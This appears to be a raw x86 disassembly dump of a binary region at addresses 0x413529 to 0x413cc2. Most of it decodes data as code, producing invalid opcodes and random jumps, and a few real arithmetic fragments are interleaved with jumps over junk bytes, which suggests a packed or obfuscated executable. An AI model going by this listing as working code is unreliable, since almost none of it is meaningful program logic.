  413529:	sub    eax,DWORD PTR es:[esi+edx*2+0x9528466]
  413531:	in     al,0x5e
  413533:	xor    bh,al
  413535:	test   al,0x6b
  413537:	loope  0x413529
  413539:	dec    ebp
  41353a:	sbb    DWORD PTR [ecx-0x11cc8c47],ebp
  413540:	div    DWORD PTR [edx+0x588193c2]
  413546:	mov    bh,0xe0
  413548:	mov    dl,0xac
  41354a:	xor    BYTE PTR [edx-0x1799c213],bl
  413550:	inc    edi
  413551:	jne    0x41351e
  413553:	cdq    
  413554:	mov    ebx,0x8b6733e8
  413559:	aam    0xd
  41355b:	push   cs
  41355c:	cmp    DWORD PTR [ebx+ebx*1-0x1e],esi
  413560:	shl    DWORD PTR [ebp+0x4a0b9be5],0x21
  413567:	je     0x413501
  413569:	push   ebx
  41356a:	scas   eax,DWORD PTR es:[edi]
  41356b:	lods   al,BYTE PTR ds:[esi]
  41356c:	xchg   ecx,eax
  41356d:	adc    ah,BYTE PTR [ebp+0x53a71344]
  413573:	push   0xec752e92
  413578:	mov    es,WORD PTR [esi+0x460154b7]
  41357e:	pop    edi
  41357f:	sbb    bh,BYTE PTR [esi]
  413581:	xchg   DWORD PTR [eax],eax
  413583:	and    dh,cl
  413585:	or     al,0xac
  413587:	mov    esi,0x9e746eee
  41358c:	ror    DWORD PTR ds:0xb9e54e1b,1
  413592:	pop    edx
  413593:	jmp    0x4135f8
  413595:	shl    BYTE PTR [edx],1
  413597:	and    DWORD PTR [ebx-0x50],edx
  41359a:	adc    esi,ebx
  41359c:	sbb    eax,0x6a03e390
  4135a1:	add    eax,0xc4bc3651
  4135a6:	outs   dx,DWORD PTR ds:[esi]
  4135a7:	dec    ecx
  4135a8:	je     0x4135ed
  4135aa:	ins    DWORD PTR es:[di],dx
  4135ac:	inc    ebx
  4135ad:	jns    0x41355e
  4135af:	(bad)
  4135b2:	in     eax,dx
  4135b3:	cmp    dl,BYTE PTR [esi-0x6a373322]
  4135b9:	lods   al,BYTE PTR ds:[esi]
  4135ba:	ins    BYTE PTR es:[edi],dx
  4135bb:	and    eax,0x67ebc327
  4135c0:	loop   0x4135a6
  4135c2:	add    BYTE PTR [ecx],ah
  4135c4:	mov    DWORD PTR [ecx],ecx
  4135c6:	test   BYTE PTR [esi+0x70],dh
  4135c9:	pop    es
  4135ca:	dec    esi
  4135cb:	jmp    0x72d1:0x64bd662f
  4135d2:	das    
  4135d3:	inc    ebx
  4135d4:	cmp    eax,0x66e65f04
  4135d9:	repz and DWORD PTR [eax+0x7c],ebx
  4135dd:	jge    0x413605
  4135df:	jle    0x413632
  4135e1:	sbb    al,0xc3
  4135e3:	jbe    0x4135db
  4135e5:	mov    dl,0xaf
  4135e7:	mov    ds:0xd718936d,al
  4135ec:	pop    ds
  4135ed:	aas    
  4135ee:	adc    eax,0xd4c84813
  4135f3:	int    0x7a
  4135f5:	push   edi
  4135f6:	inc    edx
  4135f7:	mov    bl,0xef
  4135f9:	jne    0x4135ef
  4135fb:	xor    ecx,DWORD PTR [eax+0x11]
  4135fe:	mov    eax,0x1e451351
  413603:	popf   
  413604:	sbb    ebp,DWORD PTR [edx+edx*4+0x6ecf9849]
  41360b:	clc    
  41360c:	push   edi
  41360d:	out    0xf0,eax
  41360f:	(bad)  
  413610:	rol    DWORD PTR [eax-0x6d],cl
  413613:	or     DWORD PTR [edx+0x48],esi
  413616:	add    BYTE PTR [edi],0x1a
  413619:	adc    eax,0xd859f736
  41361e:	sub    BYTE PTR [ebx],0x32
  413621:	push   ebp
  413622:	xchg   esp,ebx
  413624:	mov    dh,ch
  413626:	mov    bl,0xe7
  413628:	fs adc al,0x4f
  41362b:	rcl    dl,0x12
  41362e:	fsub   QWORD PTR [ebx-0x3f81bfb8]
  413634:	dec    ecx
  413635:	dec    edx
  413636:	jl     0x4136b0
  413638:	mov    ecx,0xd0fde186
  41363d:	loop   0x4135e7
  41363f:	fcomi  st,st(0)
  413641:	stos   BYTE PTR es:[edi],al
  413642:	ret    0xc4de
  413645:	in     eax,0x7a
  413647:	push   esp
  413648:	dec    edx
  413649:	fwait
  41364a:	pop    eax
  41364b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41364c:	push   ecx
  41364d:	std    
  41364e:	in     eax,dx
  41364f:	mov    BYTE PTR [esi],ch
  413651:	div    BYTE PTR [ecx-0x1251ab15]
  413657:	and    ebx,0x9fcd497e
  41365d:	scas   al,BYTE PTR es:[edi]
  41365e:	imul   ebx,DWORD PTR [ebx-0x5c],0xc2ac8a2f
  413665:	pop    eax
  413666:	sub    eax,0x800a4c5b
  41366b:	adc    cl,0xbb
  41366e:	out    0x81,eax
  413670:	add    ebp,0x92733f0c
  413676:	rcr    DWORD PTR [ecx+ebx*4+0x49],cl
  41367a:	gs dec ebp
  41367c:	dec    esi
  41367d:	inc    ecx
  41367e:	data16 mov dl,0xf0
  413681:	cmp    ch,BYTE PTR ds:0x5da60e00
  413687:	push   0x66
  413689:	sub    al,BYTE PTR [ebp-0x490a332c]
  41368f:	enter  0x5f0f,0x0
  413693:	or     ebx,DWORD PTR [esi+0x7d]
  413696:	jmp    0xabfd:0xd9a33914
  41369d:	test   BYTE PTR [ecx+0x719affd7],ch
  4136a3:	sub    BYTE PTR [edx],bl
  4136a5:	ret    0xe4bc
  4136a8:	jb     0x41366f
  4136aa:	pop    ebx
  4136ab:	outs   dx,DWORD PTR ds:[esi]
  4136ac:	rol    DWORD PTR [edx],0x46
  4136af:	scas   eax,DWORD PTR es:[edi]
  4136b0:	(bad)  
  4136b2:	lds    ecx,FWORD PTR [edi]
  4136b4:	xchg   esp,eax
  4136b5:	dec    eax
  4136b6:	inc    ebx
  4136b7:	dec    esp
  4136b8:	or     BYTE PTR [edi+0x7ac251ce],al
  4136be:	cmp    dh,BYTE PTR [ebx]
  4136c0:	xchg   edi,eax
  4136c1:	fcmovu st,st(5)
  4136c3:	cmp    al,0x73
  4136c5:	pand   mm5,QWORD PTR [esi-0x363c44f5]
  4136cc:	jge    0x413685
  4136ce:	leave  
  4136cf:	fnstenv [esi+0x558b92dd]
  4136d5:	mov    esp,0x33f47d8b
  4136da:	shl    BYTE PTR [ebx],1
  4136dc:	clc    
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp+0x459b7219]
  4136f4:	ins    DWORD PTR es:[edi],dx
  4136f5:	scas   al,BYTE PTR es:[edi]
  4136f6:	sub    BYTE PTR [ebp+0x7f],bh
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x413694
  4136ff:	int3   
  413700:	and    eax,0x82fb49b8
  413705:	int    0xf0
  413707:	mov    dl,0x17
  413709:	ja     0x41371b
  41370b:	jo     0x41372e
  41370d:	dec    ecx
  41370e:	loope  0x4136bf
  413710:	out    0x84,eax
  413712:	add    dl,ah
  413714:	cmp    DWORD PTR [ebx],eax
  413716:	jnp    0x41375c
  413718:	and    esp,eax
  41371a:	or     esp,ecx
  41371c:	lea    esi,[eax-0x7f]
  41371f:	test   eax,0xe1088b0a
  413724:	mov    cl,0xfd
  413726:	jecxz  0x41374f
  413728:	mov    edi,0xd1c1b3b4
  41372d:	jecxz  0x41374c
  41372f:	xchg   esi,eax
  413730:	adc    DWORD PTR [esi+edi*4+0x7c5fbf0d],esp
  413737:	mov    ds:0x83e5672d,eax
  41373c:	lea    ecx,[ebx+0x6f]
  41373f:	je     0x413779
  413741:	dec    esp
  413742:	dec    ecx
  413743:	jle    0x413782
  413745:	call   0xd5673e69
  41374a:	mov    esi,0xea742d81
  41374f:	inc    ecx
  413750:	dec    edx
  413751:	stos   BYTE PTR es:[edi],al
  413752:	or     BYTE PTR [ebx-0x5f],ah
  413755:	out    0x18,eax
  413757:	push   edi
  413758:	and    esp,0x75
  41375b:	out    0x7b,eax
  41375d:	or     cl,BYTE PTR [edi]
  41375f:	xchg   esp,eax
  413760:	test   BYTE PTR [esi],bh
  413762:	jbe    0x41372f
  413764:	ins    DWORD PTR es:[edi],dx
  413765:	aam    0x25
  413767:	push   esi
  413768:	xchg   ebx,eax
  413769:	and    esi,eax
  41376b:	jge    0x413792
  41376d:	pop    ebx
  41376e:	out    0x3,eax
  413770:	sti    
  413771:	sahf   
  413772:	(bad)  
  413773:	sti    
  413774:	iret   
  413775:	adc    bl,BYTE PTR [esi+ebp*2-0x562f33f7]
  41377c:	xchg   DWORD PTR [ebx+0x26],ecx
  41377f:	cmp    BYTE PTR [edi-0x40],al
  413782:	cmp    ebx,ebx
  413784:	jecxz  0x413773
  413786:	dec    esi
  413787:	cmp    DWORD PTR [ebx+0x42],esp
  41378a:	push   edi
  41378b:	test   eax,0x8c8a412b
  413790:	aaa    
  413791:	jg     0x4137c5
  413793:	dec    edx
  413794:	sbb    DWORD PTR [eax+0x9],0x3528518b
  41379b:	pop    ebp
  41379c:	in     al,0xed
  41379e:	aad    0xc2
  4137a0:	(bad)  
  4137a1:	loop   0x41375d
  4137a3:	push   ss
  4137a4:	dec    edi
  4137a5:	xor    al,BYTE PTR [eax]
  4137a7:	fcomp  QWORD PTR [esi+0x6b]
  4137aa:	outs   dx,BYTE PTR ds:[esi]
  4137ab:	push   0xffffff85
  4137ad:	jmp    0xec0d9a8b
  4137b2:	push   esi
  4137b3:	inc    ebp
  4137b4:	(bad)  
  4137b6:	add    al,0x49
  4137b8:	add    BYTE PTR [edx],dh
  4137ba:	ins    DWORD PTR es:[edi],dx
  4137bb:	les    ecx,FWORD PTR [ebp-0x34ce1388]
  4137c1:	iret   
  4137c2:	pop    ss
  4137c3:	aaa    
  4137c4:	arpl   WORD PTR [ebx-0x6a1924e],si
  4137ca:	cs mov dh,0xab
  4137cd:	cld    
  4137ce:	imul   ebp,DWORD PTR [edx],0x78
  4137d1:	imul   esp,edi,0xa
  4137d4:	(bad)  
  4137d5:	sub    edx,DWORD PTR [ecx+0x550d0e30]
  4137db:	test   al,0xb5
  4137dd:	scas   al,BYTE PTR es:[edi]
  4137de:	daa    
  4137df:	test   al,0x9d
  4137e1:	cld    
  4137e2:	shl    DWORD PTR [ebx+0x71],1
  4137e5:	repnz nop
  4137e7:	mov    ds,WORD PTR [eax-0xa4b4eb4]
  4137ed:	(bad)  
  4137ee:	std    
  4137ef:	in     eax,0x1d
  4137f1:	xchg   edi,eax
  4137f2:	sbb    ebp,DWORD PTR [edx]
  4137f4:	adc    al,0x5f
  4137f6:	or     ch,al
  4137f8:	scas   eax,DWORD PTR es:[edi]
  4137f9:	jmp    0xd428:0x83e08426
  413800:	inc    ebp
  413801:	retf   0xcf78
  413804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413806:	mov    cl,0x3e
  413808:	pop    esp
  413809:	imul   esi,DWORD PTR [eax],0x430fb840
  41380f:	add    BYTE PTR [edx+ebp*2],ah
  413812:	push   ss
  413813:	das    
  413814:	test   ebp,esi
  413816:	(bad)  
  413817:	sub    al,0xf5
  413819:	retf   0x73c1
  41381c:	ins    BYTE PTR es:[edi],dx
  41381d:	or     DWORD PTR [edi],ebp
  41381f:	fisttp DWORD PTR [edi]
  413821:	mov    edi,0xc0f87555
  413826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413827:	fstp   st(0)
  413829:	test   BYTE PTR [ecx+0x25],0xc6
  41382d:	push   0x83471d8c
  413832:	imul   ebp,ebx,0x6c
  413835:	push   0xfffffff2
  413837:	cwde   
  413838:	out    0x5e,al
  41383a:	jb     0x413861
  41383c:	jne    0x41386e
  41383e:	aas    
  41383f:	std    
  413840:	scas   eax,DWORD PTR es:[edi]
  413841:	int    0x7c
  413843:	or     BYTE PTR [eax-0x30e56ae0],dh
  413849:	(bad)  
  41384a:	mov    ecx,0x16742ed
  41384f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413850:	ret    
  413851:	push   ebp
  413852:	scas   al,BYTE PTR es:[edi]
  413853:	jmp    0x413882
  413855:	mov    al,ds:0xe6c359d4
  41385a:	mov    al,ds:0x68ed4fb3
  41385f:	mov    edx,0x8dacd0c4
  413864:	and    edi,DWORD PTR [ecx]
  413866:	ror    DWORD PTR [esi],1
  413868:	mov    esi,0x557cad04
  41386d:	pusha  
  41386e:	pushf  
  41386f:	ror    DWORD PTR [esi],1
  413871:	xlat   BYTE PTR ds:[ebx]
  413872:	test   eax,0xcebefff5
  413877:	cld    
  413878:	or     DWORD PTR [ebx],edx
  41387a:	daa    
  41387b:	js     0x413886
  41387d:	push   esi
  41387e:	mov    WORD PTR [eax+0x1f],es
  413881:	fwait
  413882:	jb     0x4138a1
  413884:	cmp    al,ch
  413886:	jmp    0x4138c5
  413888:	cwde   
  413889:	dec    esi
  41388a:	adc    BYTE PTR [ecx],bl
  41388c:	outs   dx,BYTE PTR ds:[esi]
  41388d:	out    dx,eax
  41388e:	cmp    ecx,esp
  413890:	and    cl,BYTE PTR [ecx]
  413892:	fcomp  QWORD PTR [edx]
  413894:	repz imul esi,DWORD PTR ds:0x1f5f8008,0xe80ab78b
  41389f:	sahf   
  4138a0:	push   ds
  4138a1:	hlt    
  4138a2:	dec    eax
  4138a3:	jne    0x41383f
  4138a5:	adc    eax,0x6b81768e
  4138aa:	in     eax,0x1b
  4138ac:	pop    edi
  4138ad:	retf   0xb7f3
  4138b0:	lea    esp,[ebx]
  4138b2:	mov    ds:0x75d5f55c,eax
  4138b7:	std    
  4138b8:	aaa    
  4138b9:	mov    ds:0x27a009e1,al
  4138be:	cmp    eax,0xce9dccb3
  4138c3:	mov    al,ds:0x801763eb
  4138c8:	mov    cl,0xf4
  4138ca:	cmp    bl,BYTE PTR [esi+0x2bc7ef4]
  4138d0:	je     0x413938
  4138d2:	out    0xd5,eax
  4138d4:	(bad)  
  4138d5:	ds int3 
  4138d7:	pop    ecx
  4138d8:	ja     0x4138ae
  4138da:	ja     0x413883
  4138dc:	ror    BYTE PTR [ecx+eax*4],1
  4138df:	mov    ah,0xe3
  4138e1:	jmp    FWORD PTR [esi-0x2d8d3360]
  4138e7:	pop    eax
  4138e8:	out    dx,al
  4138e9:	mov    dh,0xee
  4138eb:	aad    0x22
  4138ed:	imul   ebp,ebx,0x25
  4138f0:	test   eax,0x1622084
  4138f5:	mov    al,ds:0x60c44a7a
  4138fa:	mov    dh,0x59
  4138fc:	je     0x41389f
  4138fe:	std    
  4138ff:	and    cl,cl
  413901:	or     eax,edi
  413903:	sbb    edx,DWORD PTR [edi-0x2e]
  413906:	dec    esp
  413907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413908:	cli    
  413909:	enter  0x806a,0x3a
  41390d:	sbb    BYTE PTR [ebx+0x5],dl
  413910:	mov    esi,0xbcc10f0b
  413915:	xchg   edx,eax
  413916:	push   ecx
  413917:	clc    
  413918:	or     al,0xcf
  41391a:	and    al,0x3
  41391c:	jns    0x413912
  41391e:	stc    
  41391f:	pusha  
  413920:	sub    eax,0xa780dc6b
  413925:	sahf   
  413926:	mov    al,0x38
  413928:	fmulp  st(4),st
  41392a:	jmp    0x2d0:0x5073057f
  413931:	or     eax,0x6b8be637
  413936:	mov    esp,0x94445dd2
  41393b:	lods   al,BYTE PTR ds:[esi]
  41393c:	or     bh,BYTE PTR [esi+0x59d644d4]
  413942:	push   0xb6891329
  413947:	ret    0x53ad
  41394a:	ror    ebp,0xb8
  41394d:	mov    edx,0x3c3a3108
  413952:	hlt    
  413953:	sub    eax,0xbba17979
  413958:	add    al,0x4
  41395a:	and    al,0x19
  41395c:	not    BYTE PTR [ecx+eax*1]
  41395f:	pop    es
  413960:	dec    edi
  413961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413962:	out    0xd0,al
  413964:	fcmove st,st(4)
  413966:	add    bl,ch
  413968:	ss imul edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x413a08
  413996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413997:	inc    eax
  413998:	push   edi
  413999:	xchg   ebp,eax
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	or     al,0xd5
  4139a3:	(bad)  
  4139a4:	in     eax,0x18
  4139a6:	dec    ebx
  4139a7:	pop    ss
  4139a8:	(bad)  [ebx-0x4b]
  4139ab:	lods   eax,DWORD PTR ds:[esi]
  4139ac:	(bad)
  4139b0:	sar    DWORD PTR ds:0xa3a94ae4,0xc0
  4139b7:	nop
  4139b8:	(bad)  
  4139b9:	outs   dx,DWORD PTR ds:[esi]
  4139ba:	int    0xc3
  4139bc:	sbb    bh,BYTE PTR [eax]
  4139be:	mov    es,WORD PTR cs:[esi+0x86a0028]
  4139c5:	lods   al,BYTE PTR ds:[esi]
  4139c6:	mov    eax,ds:0x14142c2e
  4139cb:	stc    
  4139cc:	or     cl,BYTE PTR [ebx-0x5cb43058]
  4139d2:	pop    edi
  4139d3:	(bad)  
  4139d4:	cwde   
  4139d5:	jb     0x4139ed
  4139d7:	xchg   ebp,eax
  4139d8:	xor    dh,BYTE PTR [ebp+0x2c0735e7]
  4139de:	ds inc eax
  4139e0:	pop    ebx
  4139e1:	xor    cl,BYTE PTR [ecx-0x3961601c]
  4139e7:	gs inc ebp
  4139e9:	sbb    esp,ebp
  4139eb:	xchg   esi,eax
  4139ec:	jmp    0x4139f2
  4139ee:	pop    ebp
  4139ef:	cmp    eax,0xbfd59a6
  4139f4:	pushf  
  4139f5:	mov    ah,0x2b
  4139f7:	fidivr DWORD PTR [esi+0x78]
  4139fa:	int3   
  4139fb:	out    0xe6,al
  4139fd:	call   0xf5b37763
  413a02:	sub    ah,0xdd
  413a05:	pop    ss
  413a06:	push   es
  413a07:	in     eax,0x5f
  413a09:	retf   0xc1a3
  413a0c:	jns    0x413a59
  413a0e:	mov    BYTE PTR [edx-0x64f76982],dh
  413a14:	imul   edx,DWORD PTR [eax-0xf],0x73
  413a18:	mov    dl,0x92
  413a1a:	outs   dx,DWORD PTR ds:[esi]
  413a1b:	loopne 0x4139c9
  413a1d:	inc    esp
  413a1e:	in     eax,0xf6
  413a20:	sub    al,0x71
  413a22:	sub    esp,DWORD PTR [edx]
  413a24:	cld    
  413a25:	scas   al,BYTE PTR es:[edi]
  413a26:	jmp    0x413a2b
  413a28:	push   esp
  413a29:	bound  ebp,QWORD PTR [ebx]
  413a2b:	xchg   DWORD PTR [ebx],edx
  413a2d:	push   0xffffffdc
  413a2f:	sub    DWORD PTR [edi-0x3b6dc218],ebx
  413a35:	sub    BYTE PTR [edx],al
  413a37:	fidiv  DWORD PTR [ebx-0xf]
  413a3a:	rcl    DWORD PTR [esi*1-0x73800149],cl
  413a41:	fs inc eax
  413a43:	out    dx,al
  413a44:	call   0xfafc0346
  413a49:	push   ss
  413a4a:	in     al,dx
  413a4b:	(bad)  
  413a4c:	sub    al,0xaa
  413a4e:	fdiv   QWORD PTR [edx+eiz*1]
  413a51:	retf   0xe2ea
  413a54:	pop    esi
  413a55:	jp     0x413a00
  413a57:	add    eax,0xb5c6b5a5
  413a5c:	je     0x413ab3
  413a5e:	sbb    cl,cl
  413a60:	sbb    BYTE PTR [ebx-0x1d],ah
  413a63:	and    DWORD PTR [esi+esi*1+0x4bfc3130],esi
  413a6a:	out    dx,eax
  413a6b:	mov    bl,0x46
  413a6d:	cs popf 
  413a6f:	push   cs
  413a70:	xchg   edi,eax
  413a71:	pop    edx
  413a72:	shl    DWORD PTR [ebx],0x0
  413a75:	daa    
  413a76:	sub    DWORD PTR [ecx+0x76],esp
  413a79:	pop    ds
  413a7a:	xchg   esp,eax
  413a7b:	jae    0x413a51
  413a7d:	loop   0x413a13
  413a7f:	mov    ah,0x84
  413a81:	fld    QWORD PTR [esp+edi*1]
  413a84:	push   edx
  413a85:	xchg   ebx,eax
  413a86:	mov    ah,0x7c
  413a88:	mov    esi,0x8da41ea3
  413a8d:	je     0x413ab4
  413a8f:	hlt    
  413a90:	jmp    0x97a3:0xcf26fbb2
  413a97:	xchg   edx,eax
  413a98:	bound  esi,QWORD PTR [esi+0x26]
  413a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a9c:	cmc    
  413a9d:	xor    DWORD PTR [ecx-0x39fa241d],eax
  413aa3:	mov    esi,0x2b054014
  413aa8:	std    
  413aa9:	aad    0x53
  413aab:	enter  0x8dab,0xf4
  413aaf:	adc    DWORD PTR [ecx],0x43
  413ab2:	adc    ecx,DWORD PTR [ecx+0x6359699b]
  413ab8:	inc    ecx
  413ab9:	ds cmc 
  413abb:	(bad)  
  413abc:	ds stos DWORD PTR es:[edi],eax
  413abe:	mov    dh,0x73
  413ac0:	dec    ebx
  413ac1:	out    0x8a,al
  413ac3:	jmp    0x620c5e1e
  413ac8:	daa    
  413ac9:	pusha  
  413aca:	push   cs
  413acb:	xor    DWORD PTR [edx-0x4b],0x64
  413acf:	pop    ecx
  413ad0:	fcomip st,st(3)
  413ad2:	push   ebx
  413ad3:	xchg   ebp,esp
  413ad5:	mov    ecx,0xc7d66ef8
  413ada:	adc    al,0x97
  413adc:	push   ds
  413add:	js     0x413ad7
  413adf:	(bad)  
  413ae1:	gs pop ds
  413ae3:	xor    eax,ebp
  413ae5:	mov    cl,0xc0
  413ae7:	mov    ebp,0x51d1b1f8
  413aec:	addr16 jl 0x413ac8
  413aef:	les    ebx,FWORD PTR [edx+ebp*8+0x73a1bb97]
  413af6:	mov    WORD PTR [eax],es
  413af8:	push   ebx
  413af9:	xchg   ebp,eax
  413afa:	xchg   esi,eax
  413afb:	mov    ebp,ebp
  413afd:	dec    eax
  413afe:	mov    al,ds:0x1d8c8706
  413b03:	and    bl,0xfe
  413b06:	and    DWORD PTR [edi-0x47],ebx
  413b09:	push   esp
  413b0a:	imul   edx,DWORD PTR [ebx+esi*8],0xffffffd9
  413b0e:	mov    dh,0xd7
  413b10:	push   edx
  413b11:	add    cl,BYTE PTR [esi-0x29]
  413b14:	jg     0x413b38
  413b16:	outs   dx,DWORD PTR ds:[esi]
  413b17:	mov    ch,0x53
  413b19:	push   esi
  413b1a:	xor    DWORD PTR [eax],0x7a
  413b1d:	stos   DWORD PTR es:[edi],eax
  413b1e:	gs or  bh,cl
  413b21:	jns    0x413b0c
  413b23:	mov    ecx,0x63037ef6
  413b28:	and    dh,dh
  413b2a:	jbe    0x413ae2
  413b2c:	jl     0x413b36
  413b2e:	test   BYTE PTR [ecx-0x74],al
  413b31:	xlat   BYTE PTR ds:[ebx]
  413b32:	(bad)  
  413b33:	jo     0x413ac9
  413b35:	mov    al,ds:0x41afd59d
  413b3a:	xor    eax,0xb793d48f
  413b3f:	push   ecx
  413b40:	xor    DWORD PTR [edi],0xd4a61821
  413b46:	and    bl,bl
  413b48:	xchg   esi,eax
  413b49:	fnstsw WORD PTR [edx-0x79bad0f1]
  413b4f:	retf   0x57db
  413b52:	xchg   BYTE PTR [edx+0x9c4f722],ch
  413b58:	stos   DWORD PTR es:[edi],eax
  413b59:	xor    ebp,DWORD PTR [ecx]
  413b5b:	sub    al,0x9e
  413b5d:	call   0x4b5c:0x176f83f9
  413b64:	arpl   WORD PTR [ecx-0x281ec49b],di
  413b6a:	mov    edx,0x8df4843
  413b6f:	hlt    
  413b70:	das    
  413b71:	into   
  413b72:	push   es
  413b73:	out    0xa7,al
  413b75:	cmc    
  413b76:	jg     0x413b67
  413b78:	je     0x413ba3
  413b7a:	mov    eax,0x2532e633
  413b7f:	retf   0x8c84
  413b82:	inc    ebp
  413b83:	jge    0x413b79
  413b85:	gs imul edx,ebp,0x30
  413b89:	iret   
  413b8a:	les    ebp,FWORD PTR ds:0x7c5ed1c4
  413b90:	xchg   BYTE PTR [edx],ah
  413b92:	pop    esi
  413b93:	shr    DWORD PTR [edi+ebp*2+0x5],1
  413b97:	ss ret 0xa9fb
  413b9b:	aad    0x4c
  413b9d:	cdq    
  413b9e:	pop    ds
  413b9f:	xchg   edi,ecx
  413ba1:	mov    ch,0x0
  413ba3:	cmp    BYTE PTR [edx],0x95
  413ba6:	and    bh,ah
  413ba8:	mov    edi,0x66459e9e
  413bad:	jne    0x413b9e
  413baf:	ret    
  413bb0:	xchg   edi,eax
  413bb1:	push   cs
  413bb2:	(bad)  
  413bb3:	cmp    edi,ebp
  413bb5:	push   ebp
  413bb6:	sub    eax,0xf93c1af
  413bbb:	pop    edi
  413bbc:	push   esi
  413bbd:	loopne 0x413b6c
  413bbf:	fnstsw WORD PTR [esi+ecx*1+0x99e5572]
  413bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc7:	mov    ebx,0xd7d9ab6c
  413bcc:	jle    0x413c2c
  413bce:	sbb    eax,esi
  413bd0:	cmc    
  413bd1:	jb     0x413c19
  413bd3:	xor    al,0xec
  413bd5:	xorps  xmm7,XMMWORD PTR [edx]
  413bd8:	in     eax,dx
  413bd9:	pop    ebp
  413bda:	fmul   QWORD PTR [eax-0x129cc0c1]
  413be0:	stos   DWORD PTR es:[edi],eax
  413be1:	int3   
  413be2:	xchg   ebx,eax
  413be3:	outs   dx,DWORD PTR ds:[esi]
  413be4:	xchg   edi,eax
  413be5:	nop
  413be6:	cmp    DWORD PTR [ecx-0x4d],0x29101bb6
  413bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bee:	mov    bh,BYTE PTR [eax-0x6ac37a90]
  413bf4:	push   esp
  413bf5:	xor    DWORD PTR [ebp-0x21e0a36d],0x7cd41594
  413bff:	push   edx
  413c00:	mov    cl,0xcf
  413c02:	jbe    0x413bde
  413c04:	loopne 0x413c64
  413c06:	fadd   QWORD PTR [ecx-0x56]
  413c09:	hlt    
  413c0a:	push   esi
  413c0b:	add    DWORD PTR [ebx],ebp
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	cmp    BYTE PTR [edi],dl
  413c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c2c:	xor    eax,0x787f0002
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	jl     0x413bce
  413c37:	popf   
  413c38:	mov    esp,0x25b3c49e
  413c3d:	sub    ebx,DWORD PTR [ebx]
  413c3f:	cs sbb al,0x32
  413c42:	pushf  
  413c43:	inc    eax
  413c44:	adc    ebp,DWORD PTR [ecx]
  413c46:	xchg   esp,eax
  413c47:	lods   al,BYTE PTR ds:[esi]
  413c48:	push   0x70
  413c4a:	ds xor al,0x4d
  413c4d:	leave  
  413c4e:	icebp  
  413c4f:	or     eax,0x64b33697
  413c54:	into   
  413c55:	or     dh,dl
  413c57:	and    edx,DWORD PTR [ebp-0x6b87b138]
  413c5d:	jno    0x413cc5
  413c5f:	xchg   esi,eax
  413c60:	(bad)  [edi+0x7976dac9]
  413c66:	(bad)  
  413c68:	xchg   esi,eax
  413c69:	loop   0x413c76
  413c6b:	gs inc edi
  413c6d:	sahf   
  413c6e:	pop    es
  413c6f:	iret   
  413c70:	inc    edx
  413c71:	iret   
  413c72:	jecxz  0x413c7c
  413c74:	cmp    eax,0x7b8da78c
  413c79:	jbe    0x413ca6
  413c7b:	adc    dh,BYTE PTR [ebp-0x30]
  413c7e:	fist   DWORD PTR [eax+0x46]
  413c81:	cmp    DWORD PTR [eax+edi*1+0x59],edi
  413c85:	leave  
  413c86:	bound  ebx,QWORD PTR [eax+0x7e]
  413c89:	es mov cl,0x42
  413c8c:	(bad)  
  413c8d:	(bad)  
  413c8e:	dec    edi
  413c8f:	ret    0xf8d5
  413c92:	cmp    BYTE PTR [ebx+0x47484c7f],dh
  413c98:	jle    0x413d03
  413c9a:	leave  
  413c9b:	lods   eax,DWORD PTR ds:[esi]
  413c9c:	scas   eax,DWORD PTR es:[edi]
  413c9d:	xchg   ebp,eax
  413c9e:	and    al,0x46
  413ca0:	aam    0x85
  413ca2:	jne    0x413c69
  413ca4:	xchg   edi,eax
  413ca5:	jmp    0x413cf9
  413ca7:	inc    ebp
  413ca8:	fucom  st(3)
  413caa:	jae    0x413cfc
  413cac:	xor    ebx,DWORD PTR [ecx]
  413cae:	fild   WORD PTR [ecx-0x2cd1a7ed]
  413cb4:	push   esp
  413cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb6:	cmp    esp,DWORD PTR [ecx+0x1f]
  413cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cba:	inc    edi
  413cbb:	inc    eax
  413cbc:	daa    
  413cbd:	push   esi
  413cbe:	jp     0x413d29
  413cc0:	fwait
  413cc1:	scas   al,BYTE PTR es:[edi]
  413cc2:	jo     0x413c86
